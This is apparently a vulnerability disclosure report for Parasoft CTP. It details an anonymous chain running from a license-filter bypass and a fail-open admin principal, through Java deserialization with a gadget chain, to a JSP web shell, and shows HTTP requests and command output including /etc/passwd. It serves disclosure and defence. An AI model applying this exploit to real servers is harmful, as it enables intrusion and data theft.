:157  @RequestMapping(value={"/database"})
...
:676  @RequestMapping(value={"backup"},  method={RequestMethod.POST}, produces={"application/json"})
:707  @RequestMapping(value={"restore"}, method={RequestMethod.POST}, produces={"application/json"})
:708  public ResponseEntity<String> restore(StandardMultipartHttpServletRequest request) throws JSONException {
...
:725  ... hard-compares a zip member name against the literal "version.txt"
:733  ... hard-compares a zip member name against the literal "database.ser"
```

A note on line-number discipline, because it affects anyone reproducing this from the product log: the numbers
above are decompiler-corpus line numbers, and the runtime stack traces report different ones. The recorded
failure inside the product names `AbstractDatabaseBackup.restore(AbstractDatabaseBackup.java:114)` where the
corpus says 117, and the controller frame at runtime is 938 where the corpus says 707. Both coordinate systems
are real and they must not be conflated when matching a log line to a source line.

### Sink Identification — sink 2, the sibling readObject call sites

The same class contains two more `readObject()` calls on the same class of untrusted stream: one inside a
row-draining routine at line 323 and one inside a row-binding routine at line 435. They are not reached by the
exploit described here, because the object read at line 117 fires first, but they are the same defect in the
same file and a fix that patches only line 117 leaves two live sinks. They are named here so that the vendor's
fix covers the class rather than the call site.

### Sink Identification — sink 3, the JSP interpreter mapping

A write is only a write until something executes what was written. The execution sink is the product's own
container configuration: `conf/web.xml` declares the Jasper `*.jsp` servlet and its mapping at lines 274-275
and 448-450. The chosen landing directory, `webapps/em/images/`, satisfies three conditions at once - it is
inside the deployed web application root that the JSP mapping covers, it is writable by uid 1000 (recorded as
`drwxrwxr-x parasoft root`), and it is exempt from the license filter by the `contains("/images/")` clause at
line 166, so fetching the written file needs no bypass of its own.

Measured behaviour of this sink is in the dynamic-verification section: a `200` with an evaluated body for the
file we wrote, and a `404` carrying `Apache Tomcat/10.1.57` for a file we did not, from the same directory.
The product also produced its own third-party corroboration, generating
`work/Catalina/localhost/em/org/apache/jsp/images/<stem>_jsp.java` and `.class` for the dropped page.

### Sink Identification — sink 4, the FreeMarker template directory

A second execution sink exists and was also detonated, though the chain published here does not use it: the
directory `WEB-INF/classes/com/parasoft/rest/api/core/docs/templates/` is the FreeMarker template root, its
prefix coming from an init-param in `webapps/em/WEB-INF/web.xml` at lines 206-207, and the template engine is
FreeMarker 2.3.34 through `jersey-mvc-freemarker-3.1.12`. Because `freemarker.template.utility.Execute` is
not on any restriction list, the `?new()` built-in is usable, which turns a template write into command
execution without needing JSP compilation. Measured: a template performing `7*119` returned `200` with a
4-byte body containing `833`, and a template invoking the `Execute` built-in with `id` returned `200` with a
61-byte body containing `uid=1000(parasoft) gid=1000(parasoft) groups=1000(parasoft)` verbatim.

The JSP landing was chosen for the published chain because it is shorter, because the `.jsp` extension carries
execution semantics by itself rather than depending on a template-routing configuration, and because it needs
no knowledge of which resource path renders which template. The FreeMarker sink is recorded so that a vendor
fix that only removes JSP compilation does not close half the problem.

### Sink Identification — execution identity of the child process

The executed command runs as a child of the Tomcat JVM, with the JVM's own credentials. Three independent
observations agree: `id` executed inside the dropped page returned `uid=1000(parasoft) gid=1000(parasoft)
groups=1000(parasoft)`; the file it wrote was owned `parasoft parasoft` with mode `-rw-r-----`; and the
product process's own `/proc/1/status` reported `Uid: 1000 1000 1000 1000` for real, effective, saved and
filesystem uid. Note that the last of these was read from `/proc/1/status` rather than by running `id` through
the container runtime, which would have reported root regardless of what the product process runs as. The
image declares user 1000, and the platform's entrypoint does not elevate.

## 6. Source Identification

### Source Identification — the tainted input and its transport

The tainted input is one part of an anonymous multipart POST body:

| Part | Type | Attacker control | Role in the chain |
|---|---|---|---|
| `backup` | file part, a zip archive whose members must be named exactly `version.txt` (content observed to be `93`) and `database.ser` | total control of `database.ser` bytes | becomes the `InputStream` handed to `readObject()` |
| `json` | string part, parsed as JSON | total control | supplies connection parameters; here used to name an address that refuses connections so the flow fails fast *after* deserialization |

Both parts are ordinary, documented fields of an administrative function. Nothing about the transport is
exotic: no chunked-trailer trickery, no request smuggling, no header injection, no unusual content type. The
`Content-Type` is a standard `multipart/form-data` with a generated boundary. That matters for detection: hop
1 looks like a legitimate administrator uploading a database backup.

### Source Identification — how the json part is consumed

The `json` value is read with `request.getParameter("json")` at controller line 743, passed into a
connection-parameter assembly routine spanning lines 892-936, and deserialized by
`ConnectionParameters.fromJSON` (lines 233-258 of a 337-line class). Its fields - type name, mode, host, port,
database name - then feed the connection attempt at `AbstractDatabaseBackup:126`. The chain sets the host to a
loopback address and the port to 1 so that this attempt fails immediately and predictably. That value is a
convenience for the exploit and **not** part of the chain: no property of the vulnerability depends on the
database being unreachable, only on the deserialization happening first, which is a fact about line ordering
rather than about the supplied address.

### Source Identification — sanitization that exists, and what it is for

The restore handler is not entirely unchecked, and it is worth being precise about what its checks do, because
they are the kind of control that produces false confidence:

- The two zip member names are compared against literals. This validates the *shape* of the container - it
  guarantees that a member named `database.ser` exists - and says nothing about its content. It cannot, since
  the whole point of the field is that it holds a serialized object graph.
- Elsewhere in the product, extraction helpers do check entry names, and one of them was verified hardened
  against traversal. Those do not apply here, because this path reads members into memory rather than
  extracting them.
- The `version.txt` member carries a version number that the handler compares against the current schema
  version. It is a compatibility control, not a security control, and the recorded runs satisfied it with the
  value `93`.

### Source Identification — validation that is absent

Everything that would have made this sink safe is missing, and the list is short enough to enumerate:

- No `ObjectInputFilter`, either per-stream or process-wide, and no `jdk.serialFilter` system property in the
  image's JVM configuration.
- No check of the leading stream magic and version bytes before constructing the `ObjectInputStream` - a
  trivial structural test that would at least reject non-serialized content.
- No signature, MAC or provenance binding between a backup and the server that produced it, even though the
  documentation's own threat model assumes the file came from a same-version installation of the same product.
- No size ceiling on the member, and no constraint on the number of objects or handles in the stream.
- No class allow-list at any layer, in the core module or in the web module.
- No requirement that the caller be the administrator who exported the backup, beyond the security matcher
  that the remember-me gate satisfies for anybody.

The result is that the only decision the product makes about the uploaded bytes is whether the file containing
them has the right name.

## 7. Data Flow

### Data Flow — end-to-end chain

```text
attacker (anonymous, no cookie, no Authorization header, no CSRF token, no licence)
  |
  |  POST /em/database/restore;welcome        HTTP/1.1, multipart/form-data
  v
Tomcat 10.1.57: strips ";welcome" from the segment BEFORE servlet mapping
  |                                          -> routes to the Spring DispatcherServlet
  v
EMLicenseFilter.shouldNotFilter()  reads request.getRequestURI()  == ".../restore;welcome"
  |                                 endsWith("welcome") -> unrestricted = true
  |                                 -> doFilterInternal() NEVER RUNS
  |                                    (line 118 redirect and line 99 /tdm/api/v guard both skipped)
  v
Spring Security chain: EMRememberMeServices finds no Authorization header,
  |                    PSTSecServiceClient.getInstance() == null,
  |                    -> createAuthenticationToken("admin","admin",Role.ADMIN)
  |                    -> an AUTHENTICATED ROLE_ADMIN principal
  |                    matcher ".authenticated()" on /database is satisfied
  |                    CsrfSecurityRequestMatcher: "/database" is exempt, no token needed
  v
EMDatabaseController.restore(...)  [:707/:708]  hard-compares member names [:725, :733]
  v
AbstractDatabaseBackup.restore(...)
  |  :111  new ObjectInputStream(in)          in == the uploaded database.ser member
  |  :112  readInt()
  |  :117  readObject()   ------------------>  GADGET FIRES HERE, no filter of any kind
  |            HashSet.readObject -> HashMap.putVal -> TiedMapEntry.hashCode()
  |            -> LazyMap.get(key) -> ConstantTransformer(byte[]) -> Map.put
  |            -> SimpleCache$StoreableCachingMap.put -> writeToPath(folder + "/" + key, bytes)
  |            => /usr/local/parasoft/ctp/webapps/em/images/<leaf>.jsp created, uid 1000
  |  :126  getConnection()  -> fails against the unreachable address from the json part
  v
HTTP 500, 119 bytes, generic "error occurred while applying changes"    (status carries no signal)

attacker  |  GET /em/images/<leaf>.jsp        anonymous
          v
EMLicenseFilter: contains("/images/") -> exempt   (no bypass even needed on this hop)
          v
Jasper (mapped for *.jsp by conf/web.xml:274-275 / 448-450) compiles the page to
  work/Catalina/localhost/em/org/apache/jsp/images/<stem>_jsp.{java,class} and runs it
          v
HTTP 200, body = product-side stdout: marker line, JSP_EVAL=42, id output, /etc/passwd lines
          => arbitrary command execution as uid=1000(parasoft)
```

### Data Flow — properties of the chain worth naming

- **Ordering is the whole trick on the first hop.** Because `readObject()` precedes `getConnection()`, the
  endpoint's outcome is independent of whether the database configuration the attacker supplied is valid. An
  implementation that validated and connected before deserializing would have failed the request before the
  gadget ran. This is the single cheapest structural fix available to the vendor, and it does not require
  understanding gadget chains at all.
- **The status code is not a signal.** `500` is returned on success and would be returned on many failures; a
  `302` to `/em/license` is the only reliable failure indicator on this hop, and it means the bypass did not
  apply. Detection and exploitation both have to look past HTTP status at either a file appearing or a log
  line pairing the restore frame with a `ClassCastException`.
- **The two gates are bypassed by unrelated mechanisms.** The license gate falls to an interpretation conflict
  over the request URI; the authentication gate does not fall at all - it opens itself, by design, in a
  specific configuration state. Neither bypass is needed for the other, and a vendor could fix one and still
  be exposed through the other.
- **The write primitive is general.** It is not a "write a JSP" primitive; it is "write these bytes to this
  absolute path". The JSP mapping is what gives it execution semantics on this particular deployment shape,
  and the FreeMarker template directory is a second, independent way to convert the same write into execution.
- **Nothing leaves the target.** No DNS resolution, no RMI or LDAP callback, no HTTP fetch, no JNDI lookup.
  The gadget is entirely in-process, which means this works on hosts with no outbound connectivity and leaves
  no external artefact of the intrusion.
- **The chain is repeatable and re-enterable.** Each successful hop 1 appends exactly one occurrence of its log
  signature, and the recorded counter moved 2, then 4, then 6 across runs; there is no consumed state, no
  one-shot token and no window that closes.

### Data Flow — the interpretation conflict in one diagram

```text
                    what each component believes the request is

  raw request target:   /em/database/restore;welcome

  EMLicenseFilter       "/em/database/restore;welcome"   endsWith("welcome") == true  -> exempt
  (getRequestURI)

  Tomcat mapping        "/em/database/restore"           -> DispatcherServlet -> restore handler

  Spring Security       "/database"                      -> ".authenticated()"        -> satisfied by
                                                                                        the minted principal
  CsrfSecurityRequestMatcher  "^(/database).*$"           -> exempt, no token needed
```

Four components in one product derive four different views of one request, and the security decision is made by
the one view that still contains the path parameter while the code that acts on the decision is reached through
the view that does not. That disagreement - not a missing check, and not a weak check - is the vulnerability.

## 8. Exploit Construction

### Exploit Construction — why the classical gadget chains are dead here

The target JVM was inspected through its own process command line before any chain was attempted. Its
`--add-opens` list covers `java.base/java.lang`, `java.lang.reflect`, `java.io`, `java.util` and
`java.util.concurrent`, plus `java.rmi/sun.rmi.transport`, and no `SecurityManager` is installed (it is null).
That list decides what is exploitable:

- A comparator-driven chain using `PriorityQueue` with a bean comparator targeting `TemplatesImpl` **was**
  deserialized and **did** fire - the product's stack showed `PriorityQueue.readObject:801` into `heapify:734`
  into `BeanComparator.compare:142` - and was then stopped by the module system: `java.xml` does not export
  `com.sun.org.apache.xalan.internal.xsltc.trax`. The gadget reached its own trigger and could not complete.
- A `JdbcRowSetImpl` chain using `autoCommit` as the trigger and an `rmi://` URL was stopped the same way:
  `java.sql.rowset` does not export `com.sun.rowset`. It was confirmed by a second, independent observation -
  a native listener on the sandbox host received no inbound connection during a 25-second window.
- No JDBC driver of the commonly abused families is present. A survey of all 238 jars found no PostgreSQL,
  MySQL, Oracle, Derby or H2 driver, so the JDBC-connection style of gadget has nothing to connect with. (The
  platform talks to HSQLDB in-process, which is not the same surface.)

Recording these dead ends is not padding. It is the reason the published chain has the shape it does: on a
modern JDK with default module boundaries, the usable gadget set is whatever lives entirely in the unnamed
module.

### Exploit Construction — the working chain needs no closed module

Two bundled libraries supply it: `aspectjweaver-1.9.25.1.jar` (2,190,661 bytes, md5
`7a88f606f52185a15a1527c968f55dfb`) and `commons-collections4-4.5.0.jar`. All four classes used are in the
unnamed module, and `java.base/java.util` is already open, so no JPMS obstacle arises:

```text
ObjectInputStream.readObject()
 -> java.util.HashSet.readObject -> HashMap.putVal(hash(key), ...) => key.hashCode()
 -> org.apache.commons.collections4.keyvalue.TiedMapEntry.hashCode() -> getValue()
 -> org.apache.commons.collections4.map.LazyMap.get(key)     // !containsKey => factory.transform(key)
    => map.put(key, value)         // invokeinterface java/util/Map.put  => virtual dispatch
 -> org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap.put(key, byte[])
 -> writeToPath(folder + File.separator + key, bytes)                       // arbitrary write
```

The transformer is a `ConstantTransformer` holding the byte array to be written. That choice is deliberate and
is what keeps this chain out of the territory the vendor's own library version already blocks: in
commons-collections4 4.5.0, `InvokerTransformer` no longer declares `Serializable` at all - an early
hypothesis that it was guarded by an unsafe-serialization check was disproved by reading the functor utility
class, which contains no such check - so the invocation-style functor chains are simply not constructible from
a stream. `ConstantTransformer` is a plain data holder, is serializable, and imposes no constraint on its
payload beyond the type of the field. The chaining decorators (`TiedMapEntry`, `LazyMap`) remain available and
are the only reason the write occurs during deserialization rather than later.

One field value is set deliberately: `storingTimer` is `Integer.MAX_VALUE`, which suppresses the index file the
caching map would otherwise write alongside the payload, so exactly one file lands on disk and nothing else has
to be cleaned or explained.

### Exploit Construction — four bytecode-level facts that make the write arbitrary

The class was read at the bytecode level (single-class disassembly, per the project's rule against
whole-library dumps) to answer four questions:

- **Is `folder` settable from the stream?** Yes. It is declared `private final String folder`, is not
  `transient`, and the class declares no `readObject` of its own, so it is populated by the inherited
  `HashMap.readObject` path through `defaultReadObject`, which assigns whatever the stream carries. Both
  `writeToPath` and the store routine read it with an explicit `getfield`, so the compiler has not inlined it
  as a constant.
- **How does a map key become a file name?** `writeToPath` performs `getfield folder`, builds a
  `StringBuilder`, concatenates a separator and the key, and stores the result - that is the entire function.
  There is no forced extension appended to the key; an earlier assumption that a cache-specific suffix would be
  added, which would have removed any execution surface, was disproved at the bytecode level. The value goes
  through `checkcast "[B"`, so the content is any byte array. The only constraint found anywhere is that the
  content must not be exactly the four bytes `IDEM`, which the caching map uses as its own sentinel.
- **Can the key carry traversal or the folder be absolute?** Yes on both. Validation is absent in every form:
  zero occurrences of `File.getName()`, `Path.normalize()`, `getCanonicalPath()`, `startsWith()`, a regular
  expression or a length truncation in the write path. Keys of the shape `a/b/c.jsp` and `../../../x.jsp` both
  work, and because the concatenation with an empty folder yields a leading double separator - which POSIX
  treats as a valid absolute path - an absolute destination is reachable too.
- **Does it fire on deserialization alone?** No, and this is the subtle part. `HashMap.readObject` reconstitutes
  entries by calling `putVal`, which is package-private and final and is not overridden, so it bypasses the
  overridden `put` that contains the write. The gadget therefore has to be forced through `put` by a virtual
  dispatch, which is exactly what the `TiedMapEntry.hashCode()` to `LazyMap.get()` to `Map.put` prefix exists
  to do. Constructing the stream without that prefix produces a valid object and no write.

### Exploit Construction — the serialised stream, region by region

The published carrier is a 1,178-byte stream containing 19 handles, all of which are consumed. Its layout:

```text
writeInt(1)                                  <- consumed by AbstractDatabaseBackup:112 readInt()
TC_OBJECT java.util.HashSet                  suid -5024744406713321676, flags 0x03 (serializable|write-method)
  blockdata(12): capacity 2, loadFactor 0.75f, size 1
  element 1: TiedMapEntry                    suid -8453869361373831205, flags 0x02
    field key   = TC_STRING "<leaf name>"    <- patch point 1
    field map   = LazyMap                    suid 7990956402564206740, flags 0x03
      field factory = ConstantTransformer    suid 6374440726369055124, flags 0x02
        field iConstant = byte[]             <- patch point 2 (int32 length prefix, then raw bytes)
      super AbstractMapDecorator.map = SimpleCache$StoreableCachingMap
                                             suid -5700439274427193966, flags 0x02
        field J lastStored
        field I storingTimer = 2147483647    <- suppresses the index file
        field L folder = TC_STRING "<dir>"   <- patch point 3
        super java.util.HashMap              suid 362498820763181265, flags 0x03
          F loadFactor, I threshold
          blockdata(8): 16, 0
```

The generator in the published PoC treats this as an immutable skeleton and rewrites only the three marked
regions, leaving every class descriptor, `serialVersionUID`, field order and handle back-reference byte-for-byte
untouched. Its `--selftest` mode encodes the discipline: it rebuilds the skeleton using the *original* values
of the three regions and asserts byte identity with the archived carrier (md5
`6099d3f5fd36e28d8934c2e4e6c95da6`, 1,178 bytes), then rebuilds with new values and asserts that the new
folder, leaf and content appear verbatim. That self-test was run locally as part of preparing this publication
and passed, which is what makes the claim "this generator produces the stream that was proven against the
product" checkable by a reader who has no target to shoot at.

### Exploit Construction — the payload page

The written bytes are a JSP page rather than a script, and its construction reflects three constraints learned
the hard way:

- The operator-supplied command is carried base64-encoded and decoded with `java.util.Base64` at request time,
  so no quoting conflict can arise between the JSP source, the Java string literal and the shell. Every command
  tested survived the round trip unchanged.
- The shell invocation is `new ProcessBuilder(new String[]{"/bin/sh","-c", "export LC_ALL=C LANG=C; id; echo
  CMD_OUT_BEGIN; " + cmd + "; echo CMD_OUT_END"})` with the error stream redirected into the output stream. The
  locale is pinned because `id` and `ls` output in a non-English locale breaks automated reading of the result.
- The page prints a per-run marker, a server-evaluated arithmetic expression (`6*7` printed as `42`, which is
  distinguishable from source echo, where the literal expression text would appear), its own absolute path, its
  own file size, the `id` output, the delimited command output, and - unless asked not to - the results of
  deleting itself and both of its Jasper compilation artefacts.

### Exploit Construction — what the exploit deliberately does not do

- It does not install, forge, modify or clear any licence. No licence material is touched at any point; the
  license gate is bypassed, not satisfied.
- It does not use MITM, DNS hijacking, TLS interception, an RMI or LDAP callback, or any outbound connection.
- It does not attempt privilege escalation and does not claim root.
- It does not claim to clean up completely. It deletes the dropped page and its two Jasper artefacts, then
  refetches the same URL and reports honestly what it finds - which is that the compiled servlet is still
  being served. The cleanup report is a forensic finding, not a guarantee.
- It does not persist: no startup mechanism, no second web shell, no account creation, no configuration change
  beyond what a single restore call inherently performs.
- It does not carry a hardcoded target address. The default in its help text is a loopback address, and it
  refuses to fire at all if the target URL has no scheme, no host, a non-rooted path or a doubled slash in the
  path.

That last point exists because two of the four iterations of the client script failed for reasons that had
nothing to do with the target, and both failures are worth recording since they are the kind that produce
false negatives against a real product:

- In one iteration a context-path normalisation used a left-strip on the context and concatenated it directly,
  producing a URL of the shape `http://127.0.0.1:19020em/database/restore;welcome`. The client raised
  `http.client.InvalidURL: nonnumeric port` and the run was aborted before a packet was sent.
- In the next iteration an "idempotent join" helper produced a doubled slash,
  `/em//database/restore;welcome`, and Tomcat answered `404`. The unit test added alongside that helper
  asserted only that the URL was parseable - it did, and it was - so it guarded the wrong property and the
  failure reached the target before it was noticed.

The lesson encoded in the published script is that the assertion has to state the property that actually
matters to the servlet container (no doubled slash, rooted path), not the property that is easy to check
(parses cleanly). Both are now enforced by a pre-flight validator that refuses to send.

### Exploit Construction — the container and the ready check

The upload zip is written with two members in order, `version.txt` (content `93`) and `database.ser`, both
DEFLATE-compressed, because the handler hard-compares those two names. The recorded live run's artefacts were
a 2,076-byte `database.ser` (md5 `ff9e842a127e9b54b97b6b0ad0a05371`) and a 1,378-byte upload archive (md5
`00fa45ebd53d30774de3c52bbe3b6f41`) carrying a 1,372-byte page; a fresh run of the published generator with
its own nonce and command produces different sizes and digests, which is expected and is why the digests are
quoted per-run rather than as constants.

The readiness check is also worth stating, because the obvious one is wrong: the platform's health endpoint
answers with a redirect and the image's own container healthcheck reports healthy unconditionally, so readiness
was determined by requesting the current-user endpoint and confirming the JSON identity body. Using the health
endpoint as a readiness signal will report a not-yet-started application as ready.

## 9. Dynamic Verification

### Dynamic Verification — environment

| Item | Value |
|---|---|
| Target | the platform's container, HTTP published to a loopback address on the sandbox host |
| Deployment | Docker container started from the unmodified vendor image `parasoft/ctp:latest` (985 MB loaded; saved copy 997,805,056 bytes, md5 `47946c7d1e7d99a00d6c90f4ae675f90`) |
| Version | CTP `10.7.5-SNAPSHOT`, `Build-Timestamp 202608231700 +0000`, buildId shape `ctp<nightly stamp>-1000`; Tomcat 10.1.57 with Jasper; JDK 17.0.20.1; Spring 6.2.19; Spring Security 6.5.11; Jersey 3.1.12; commons-collections4 4.5.0; aspectjweaver 1.9.25.1 |
| Instance state | factory: unlicensed, and no external security provider configured |
| Evidence for that state | `GET /em/pstsecconfig` with `Accept: application/json` returned `404` with a zero-length body, matching the shipped controller's `getActiveConfig()==null` branch; reproduced on two instances, so it is not an artefact of one container |
| Client | Python 3.11.6, standard library only, run by an ordinary unprivileged user on the same sandbox host |
| Product process identity | `Uid: 1000 1000 1000 1000` read from `/proc/1/status` of the container's init process (not via a container-runtime `id`, which would report root regardless) |
| Clock note | the container's clock and the research host's clock were not synchronised; timestamps quoted from inside the container are the container's, and the timestamps inside recorded command output are elided here because they describe our sandbox rather than the product |

No packet left the sandbox at any point. The chain requires no outbound connectivity, and none was available to
it.

### Dynamic Verification — hop 1, the write

```text
POST /em/database/restore;welcome HTTP/1.1
Host: 127.0.0.1:<published loopback port>
Content-Type: multipart/form-data; boundary=<generated>
(no Cookie, no Authorization, no X-CSRF-TOKEN)

  part backup = zip { version.txt: "93", database.ser: <carrier + gadget> }   1,378 B total
  part json   = {"typeName":"HyperSQL","mode":"HOST_PORT","host":"127.0.0.1","port":1,"db":"poc"}

<- HTTP/1.1 500     size=119
   {"message":"An error occurred while applying changes to the database configuration. Please check the log for details."}
```

The recorded client-side summary of the same run, verbatim:

```text
[*] hop 1  POST http://127.0.0.1:<port>/em/database/restore;welcome   (anonymous: no cookie / no authorization / no CSRF token)
[*] hop 1  HTTP 500  size=119  0.0s
[*] hop 1  note: HTTP 500 with 'error occurred while applying changes' is EXPECTED -
[*]             readObject() runs before the DB connect, so the status code is not a signal.
[*] database.ser    : 2076 bytes, md5 ff9e842a127e9b54b97b6b0ad0a05371
[*] upload zip      : 1378 bytes, md5 00fa45ebd53d30774de3c52bbe3b6f41
```

### Dynamic Verification — why a 500 is the success signature

Nothing in the HTTP exchange distinguishes a fired gadget from an ordinary configuration failure, so the
success criterion had to come from the product itself. The product log carries a stack trace whose shape is
specific to this payload:

```text
... com.parasoft.ctp.core.database.backup.AbstractDatabaseBackup.restore(AbstractDatabaseBackup.java:114)
    class java.util.HashSet cannot be cast to class ...TableMetadata
    java.lang.ClassCastException
```

Read carefully, that line is a *success* indicator for the attacker and a diagnostic for the defender. The cast
exception proves `readObject()` returned an object - our `HashSet` - rather than throwing during
deserialization. It is distinguishable from a malformed or unloaded payload, which instead produces a
`ClassNotFoundException` naming whatever class the stream referenced. Counting that signature across runs gave
2, then 4, then 6 occurrences in the container logs, i.e. exactly one increment per successful hop 1, which is
what turns a single anecdote into a repeatable measurement.

### Dynamic Verification — hop 2, the execution

```text
GET /em/images/<leaf>.jsp HTTP/1.1        (zero credentials)

<- HTTP/1.1 200     size=538
RCE_OK <12-hex nonce>
JSP_EVAL=42
FILE=/usr/local/parasoft/ctp/webapps/em/images/<leaf>.jsp
SIZE_SELF=1372
uid=1000(parasoft) gid=1000(parasoft) groups=1000(parasoft)
CMD_OUT_BEGIN
uid=1000(parasoft) gid=1000(parasoft) groups=1000(parasoft)
-rw-r----- 1 parasoft parasoft 1372 <timestamp elided> /usr/local/parasoft/ctp/webapps/em/images/<leaf>.jsp
Uid:    1000    1000    1000    1000
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
<kernel release elided: identifies our sandbox, not the product>
CMD_OUT_END
SELF_DELETE=true
WORK_DELETE=true,true
```

Four independent properties of that body make it attributable to code execution rather than to anything else:

- `JSP_EVAL=42` is the product's own evaluation of the expression `6*7` at request time. An echo of the source
  file would have shown the literal expression text instead of the value.
- `SIZE_SELF=1372` is the page reading its own length from disk and agreeing with the length of the payload the
  client built, which establishes byte-exact content control rather than partial or transformed writing.
- The `ls -la` line shows the file owned by the product's own service account with the size again, and the
  `/proc/1/status` line shows the product process's uid quadruple from inside the container.
- The two `/etc/passwd` lines were read by the product process, establishing arbitrary read at that identity.

One clarification on marker text, since two forms appear across the evidence. The runtime page generator prints
`RCE_OK <nonce>`; the archived 1,178-byte carrier that the generator patches contains, in its own embedded
payload region, a page printing a differently named marker of the same form (a `JSP-EXEC-OK` style line) and
its own evaluated `6*7`. Both markers exist in the evidence because one is the skeleton's demo content and the
other is what the run actually served. The nonce is generated per run and is what makes the executed body
unique to that run.

### Dynamic Verification — the negative controls

Six controls were recorded, and each one removes a specific alternative explanation:

| Control | Observed | What it excludes |
|---|---|---|
| hop 1 without `;welcome` in the target | `302` with `Location: /em/license` | that the restore endpoint is reachable on an unlicensed instance without the bypass |
| hop 1 with the `backup` part omitted | `400`, 59 bytes | that any POST to the mapping produces the same result |
| hop 2 against a never-written file in the same directory | `404`, 762 bytes, Tomcat's `JSP file [&#47;images&#47;...] not found` page with the `Apache Tomcat/10.1.57` footer | that some pre-existing page answers that path; the run marker appears once in the executed body and zero times in this one |
| the license-bypass read with the suffix but no `;` | `404`, 792 bytes | that the exemption is matching a literal suffix rather than a path parameter |
| the identity endpoint with `Authorization: Bearer garbage` | `401`, zero-length body | that the anonymous `200` identity response is unconditional on credentials |
| the `/em/tdm/api/v2/servers` resource without the bypass | `200`, 90 bytes, `Continuous Testing Platform is not licensed.` | that the `;welcome` variant's well-formed XML response could have come from the fixed unlicensed path |

The last of these deserves a word because it looks like a false negative that is not one: the endpoint returns
HTTP `200` while reporting a `403` message code in its JSON body. That is the product's own behaviour and it
traces to the license filter flushing the response before setting the status, which makes the `setStatus(403)`
call dead code. Any monitoring that keys on HTTP status for licence failures on this product will miss every
one of them.

### Dynamic Verification — hop 3, deleting the file does not disable the servlet

After the page deleted itself and both Jasper compilation artefacts, the same URL was fetched again on purpose.
It returned `200` with a body 536 bytes long - two bytes shorter than the first response, precisely because the
`ls -la` command inside it could no longer find the file it was listing. The compiled servlet instance was still
loaded in the JVM and still served requests.

This is recorded as a finding in its own right rather than as a footnote, because it has a defensive
consequence that is easy to get wrong: an operator who finds a dropped `.jsp`, deletes it, deletes the compiled
class underneath `work/`, and sees the file gone has *not* removed the web shell. Only a context reload or a
JVM/container restart does. The published PoC does not claim to have cleaned the target; it performs the
refetch and reports the truth about what it finds.

### Dynamic Verification — independent target-side checks

Everything the client reported was re-verified from the target side rather than trusted from the script's own
output:

- The images directory's file count went 39 before the run, 40 immediately after, and back to 39 after
  self-deletion - a single-file difference matching the single payload.
- The Jasper residue under `work/` after cleanup was zero entries.
- A filesystem search for the run's marker leaf name under the product tree and under `/tmp` returned zero
  results.
- The container was destroyed afterwards and its published ports were confirmed free, leaving only the
  read-only reference instance running.

### Dynamic Verification — number of successful detonations, stated exactly

Two end-to-end detonations of the two-hop chain are recorded as successful. The first proved the chain but left
its Jasper compilation artefacts on disk; the second, with the completed cleanup logic, produced the artefact set
quoted above plus the hop-3 forensic finding. Two intermediate iterations did not fire at all, and both failed
in the client script rather than against the target - one on a malformed URL that raised before a packet was
sent, one on a doubled slash that the container answered with `404`. Those two are recorded as client bugs, not
as evidence about the product.

Separately, the license-bypass leg was measured many times over HTTP and HTTPS on read-only endpoints, and the
alternative FreeMarker landing was detonated and recorded with its own evaluated outputs. Neither of those is
counted in the two figure above, which refers only to full two-hop deserialization-to-execution runs.

### Dynamic Verification — what was driven from a separate network host, and what was not

Nothing. The client ran on the same sandbox host that ran the container, reaching it through a published
loopback port. That is a deliberate containment choice, and it bounds one claim in this document: reachability
from a second machine over a routed network is argued from the shipped listener topology (the container accepts
connections on its HTTP and HTTPS ports from outside itself, and the product ships no front-end proxy or
filter of its own) and not demonstrated between two hosts. Every other claim in the chain - the bypass, the
principal, the write, the execution, the identity, the persistence of the compiled servlet - was measured over
real HTTP against a real product process.

### Dynamic Verification — boundaries of what was verified

- Only the factory configuration state was detonated. A deployment with the external security provider
  configured was not tested end to end; what changes in that state is described from source and scored as a
  conditional reading.
- Only one build of the product was executed. No older release, no newer release, no Windows variant and no
  differently-configured instance was fired at.
- The forged session cookie was exercised only where it is redundant. Its use to satisfy an
  authenticated-subject requirement in a configured deployment is a static inference and is **not verified**.
- The JavaScript-engine evaluation path was proven at the capability layer in isolation and was not proven
  reachable anonymously; two preconditions were never satisfied, so no claim about it appears in the rated
  chain or in the impact section.
- The arbitrary-read and arbitrary-delete primitive through the temp-file handler was measured, and is reported
  to the vendor as a separate defect with its own CWE, without being folded into this score.

## 10. Reachability and Security Impact

### Reachability and impact — network position

The platform is a server product with no client-side component in the chain: both hops are plain HTTP requests
to listeners the product binds and serves itself. The container exposes HTTP and HTTPS, both of which were used;
the HTTPS listener is an equivalent surface rather than a redirect shell, which was measured directly on the
bypass leg. The product ships no reverse proxy, no WAF and no separate management listener, so any operator
choice about who can reach those ports is made entirely outside the product, with no default narrowing supplied
by the vendor. In a typical enterprise deployment this platform sits where its users and its CI pipelines can
reach it, which is what makes an anonymous two-request chain valuable to an attacker: the population of clients
that can reach it is broad and is not a privileged administrative network.

What is deliberately not claimed is a measured internet reach. Our testbed published the ports to loopback. The
network vector in the score rests on the product's own listener behaviour and the absence of any shipped
front-end control.

### Reachability and impact — what the achieved identity controls

Execution as uid 1000 inside the product's JVM puts the following in scope, all of which is either measured or a
direct property of the filesystem permissions observed:

- The product tree under `/usr/local/parasoft/ctp`, including the deployed `em` web application (writable -
  that is how the page was created), the container's own `conf/` including `server.xml` and `web.xml`, and the
  work directory where Jasper writes compiled pages.
- The platform's HSQLDB database files, which the `currentConfig` response itself disclosed the location of, and
  through them every environment definition, system definition, virtual-service definition and test-data record
  the platform manages, plus whatever credentials or connection strings the platform stores on behalf of the
  systems it virtualises.
- Anything else on the host filesystem readable by uid 1000 - measured concretely by reading `/etc/passwd` from
  inside the container.
- The product's own licence and security state, in the sense that arbitrary in-process code can rewrite
  configuration files and restart the application's view of them - which is why the fail-open and
  unlicensed-bypass conditions an operator might rely on as compensating controls are not durable ones.

Also within reach, structurally rather than by demonstration: the ability to overwrite the deployed
application's own JSP or class files, which converts a single write into persistence that survives a restart.
That was not performed, and it is flagged here as an unexercised consequence of a primitive that was proven, not
as a measurement.

### Reachability and impact — the privilege question, answered in full

The landing identity is `uid=1000(parasoft)`, confirmed three ways as described in the sink section. It is not
root and no claim of root is made. The container image declares user 1000, the platform's entrypoint runs the
application without elevating, and no escalation was attempted: no kernel-exploitation, container-escape or
setuid path was enumerated, tested or asserted. Where this platform is deployed on a host rather than in a
container, the runtime identity is whatever the installer configured, and the honest expectation is a dedicated
service account rather than a privileged one.

